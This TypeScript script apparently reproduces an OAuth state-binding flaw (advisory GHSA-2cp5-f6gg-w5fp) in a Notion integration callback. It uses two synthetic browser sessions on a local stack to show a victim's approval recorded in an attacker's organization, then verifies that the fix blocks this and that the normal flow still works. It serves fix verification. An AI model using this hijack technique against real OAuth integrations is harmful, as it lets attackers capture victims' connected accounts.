/**
 * Drives GHSA-2cp5-f6gg-w5fp end to end against the local stack.
 *
 *   bun run drive.ts before   — victim B completes a flow A started
 *   bun run drive.ts after    — same, plus the honest same-browser flow
 *
 * Everything is synthetic: a throwaway Neon project, two throwaway accounts,
 * and a local stand-in for the provider's token endpoint.
 */
import { writeFileSync } from "node:fs";
import { type Browser, evaluate, goto, launch, screenshot } from "./cdp";
import { pool, q } from "./db";

const WEB = "http://localhost:3000";
const API = "http://localhost:3001";
// The state cookie is scoped to the flow's own path, so cookies must be read
// for that path rather than the API origin.
const FLOW_PATH = "http://localhost:3001/api/integrations/notion/callback";
const OUT = "/workspace/evidence";
const phase = process.argv[2] === "after" ? "after" : "before";
const stamp = Date.now();

const lines: string[] = [];
function say(line = ""): void {
	console.log(line);
	lines.push(line);
}

async function signUp(b: Browser, email: string, name: string): Promise<void> {
	await goto(b, `${WEB}/sign-in`);
	const result = await evaluate<number>(
		b,
		`fetch(${JSON.stringify(`${API}/api/auth/sign-up/email`)}, {
			method: "POST",
			credentials: "include",
			headers: { "content-type": "application/json" },
			body: JSON.stringify({ email: ${JSON.stringify(email)}, password: "synthetic-password-1234", name: ${JSON.stringify(name)} }),
		}).then(r => r.status)`,
	);
	if (result !== 200)
		throw new Error(`sign-up for ${email} returned ${result}`);
	await goto(b, `${WEB}/`);
}

async function sessionUser(b: Browser): Promise<{ id: string; email: string }> {
	const body = await evaluate<string>(
		b,
		`fetch(${JSON.stringify(`${API}/api/auth/get-session`)}, { credentials: "include" }).then(r => r.text())`,
	);
	const parsed = JSON.parse(body || "null");
	if (!parsed?.user) throw new Error("no session in this browser");
	return { id: parsed.user.id, email: parsed.user.email };
}

async function orgOf(userId: string): Promise<{ id: string; name: string }> {
	const rows = await q<{ id: string; name: string }>(
		`select o.id, o.name from auth.organizations o
		 join auth.members m on m.organization_id = o.id
		 where m.user_id = $1 order by o.created_at limit 1`,
		[userId],
	);
	if (!rows[0]) throw new Error(`no organization for ${userId}`);
	return rows[0];
}

type ConnectionRow = {
	id: string;
	organization_id: string;
	connected_by_user_id: string;
	external_account_id: string;
	external_account_label: string | null;
};

async function connections(): Promise<ConnectionRow[]> {
	return q(
		`select c.id, c.organization_id, c.connected_by_user_id, c.connector, c.external_account_id, c.external_account_label
		 from connections c where c.connector = 'notion' order by c.created_at`,
	);
}

// Each run starts from a clean slate so the rows printed below are this run's.
await q(`delete from connections where connector = 'notion'`);

const a = await launch("a", 9222);
const b = await launch("b", 9223);

try {
	const emailA = `attacker+${stamp}@synthetic.test`;
	const emailB = `victim+${stamp}@synthetic.test`;
	await signUp(a, emailA, "Synthetic Attacker A");
	await signUp(b, emailB, "Synthetic Victim B");

	const userA = await sessionUser(a);
	const userB = await sessionUser(b);
	const orgA = await orgOf(userA.id);
	const orgB = await orgOf(userB.id);

	await screenshot(a, `${OUT}/${phase}-session-a.png`);
	await screenshot(b, `${OUT}/${phase}-session-b.png`);

	say(`GHSA-2cp5-f6gg-w5fp — ${phase.toUpperCase()} the fix`);
	say(
		`run at ${new Date().toISOString()}  (commit ${Bun.spawnSync(["git", "rev-parse", "--short", "HEAD"], { cwd: "/workspace" }).stdout.toString().trim()})`,
	);
	say();
	say(`browser session A  user=${userA.id}  ${userA.email}`);
	say(`                   org =${orgA.id}  "${orgA.name}"   <- ATTACKER's org`);
	say(`browser session B  user=${userB.id}  ${userB.email}`);
	say(`                   org =${orgB.id}  "${orgB.name}"   <- VICTIM's org`);
	say();

	// 1. A starts a connect flow for A's own org and captures the signed state.
	const connectUrl = `${API}/api/integrations/notion/connect?organizationId=${orgA.id}`;
	await goto(a, connectUrl);
	const providerUrl = a.redirects.find((u) =>
		u.startsWith("https://api.notion.com/v1/oauth/authorize"),
	);
	if (!providerUrl)
		throw new Error(`no provider redirect; chain: ${a.redirects.join(" -> ")}`);
	const stateA = new URL(providerUrl).searchParams.get("state") ?? "";
	const cookieA = await a.send<{ cookies: Cookie[] }>("Network.getCookies", {
		urls: [FLOW_PATH],
	});
	say(`1. session A  GET ${connectUrl}`);
	say(`   -> 302 ${providerUrl.slice(0, 110)}...`);
	say(`   signed state minted for A: ${stateA.slice(0, 48)}...`);
	const boundA = cookieA.cookies.find((c) => c.name.includes("oauth_state"));
	say(
		`   state cookie on A for this flow: ${boundA ? `${boundA.name} (httpOnly=${boundA.httpOnly}, sameSite=${boundA.sameSite}, path=${boundA.path})` : "NONE — the state is bound to nothing"}`,
	);
	if (boundA)
		say(
			`   and it holds exactly that state: ${decodeURIComponent(boundA.value) === stateA}`,
		);
	say();

	// 2. B — a different browser, a different account — completes the callback
	//    with A's state, exactly as if A had mailed B the provider link.
	const callbackUrl = `${API}/api/integrations/notion/callback?code=synthetic-authorization-code&state=${encodeURIComponent(stateA)}`;
	const cookieBbefore = await b.send("Network.getCookies", {
		urls: [FLOW_PATH],
	});
	const landedB = await goto(b, callbackUrl);
	await screenshot(b, `${OUT}/${phase}-victim-completes-callback.png`);
	say(`2. session B  GET ${callbackUrl.slice(0, 96)}...`);
	say(
		`   B's cookies for this flow's path: ${JSON.stringify(cookieBbefore.cookies.map((c) => c.name))}`,
	);
	say(
		`   B holds no state cookie for the flow: ${!cookieBbefore.cookies.some((c) => c.name.includes("oauth_state"))}`,
	);
	say(`   landed on: ${landedB}`);
	say();

	const rows = await connections();
	say(`3. connections rows for connector 'notion' after B approved:`);
	if (rows.length === 0) say(`   (none)`);
	for (const r of rows) {
		const owner =
			r.organization_id === orgA.id
				? "ATTACKER org A"
				: r.organization_id === orgB.id
					? "victim org B"
					: "unknown org";
		say(`   id=${r.id}`);
		say(`     organization_id      = ${r.organization_id}  <- ${owner}`);
		say(`     connected_by_user_id = ${r.connected_by_user_id}`);
		say(
			`     external_account     = ${r.external_account_id} "${r.external_account_label}"`,
		);
	}
	say();

	const hijacked = rows.some((r) => r.organization_id === orgA.id);
	if (phase === "before") {
		say(
			hijacked
				? `RESULT: VULNERABLE. B's approval was recorded against A's organization.`
				: `RESULT: no row written to A's org — repro did not land.`,
		);
		writeFileSync(
			`${OUT}/before-installation-owner.txt`,
			`${lines.join("\n")}\n`,
		);
	} else {
		say(
			hijacked
				? `RESULT: STILL VULNERABLE. B's approval was recorded against A's organization.`
				: `RESULT: BLOCKED. Nothing was written; the callback refused A's state in B's browser (landed on ${landedB.includes("error=invalid_state") ? "error=invalid_state" : landedB}).`,
		);
		writeFileSync(
			`${OUT}/after-installation-blocked.txt`,
			`${lines.join("\n")}\n`,
		);

		// The honest flow: A starts and A finishes, in one browser.
		lines.length = 0;
		say(`GHSA-2cp5-f6gg-w5fp — AFTER the fix: normal same-browser flow`);
		say(`run at ${new Date().toISOString()}`);
		say();
		await goto(a, connectUrl);
		const again = a.redirects.find((u) =>
			u.startsWith("https://api.notion.com/v1/oauth/authorize"),
		);
		const freshState = new URL(again ?? "").searchParams.get("state") ?? "";
		const cookies = await a.send<{ cookies: Cookie[] }>("Network.getCookies", {
			urls: [FLOW_PATH],
		});
		const bound = cookies.cookies.find((c) => c.name.includes("oauth_state"));
		say(`1. session A  GET ${connectUrl}`);
		say(`   -> 302 to the provider with state ${freshState.slice(0, 40)}...`);
		say(
			`   cookie ${bound?.name} holds the same state: ${bound ? decodeURIComponent(bound.value) === freshState : "n/a"}`,
		);
		say();
		const sameBrowser = `${API}/api/integrations/notion/callback?code=synthetic-authorization-code&state=${encodeURIComponent(freshState)}`;
		const landedA = await goto(a, sameBrowser);
		await screenshot(a, `${OUT}/after-normal-flow-session-a.png`);
		say(`2. session A  GET the callback in the SAME browser`);
		say(`   landed on: ${landedA}`);
		say();
		const after = await connections();
		say(`3. connections rows for connector 'notion':`);
		for (const r of after) {
			const owner =
				r.organization_id === orgA.id
					? "org A (the browser that started AND finished)"
					: "other";
			say(`   id=${r.id}  organization_id=${r.organization_id}  <- ${owner}`);
			say(`     connected_by_user_id = ${r.connected_by_user_id}`);
		}
		const ok = after.some(
			(r) =>
				r.organization_id === orgA.id && r.connected_by_user_id === userA.id,
		);
		say();
		say(
			ok
				? `RESULT: OK. The same-browser flow still connects.`
				: `RESULT: REGRESSION — the honest flow no longer connects.`,
		);
		writeFileSync(`${OUT}/after-normal-flow-ok.txt`, `${lines.join("\n")}\n`);
	}
} finally {
	a.close();
	b.close();
	await pool.end();
}
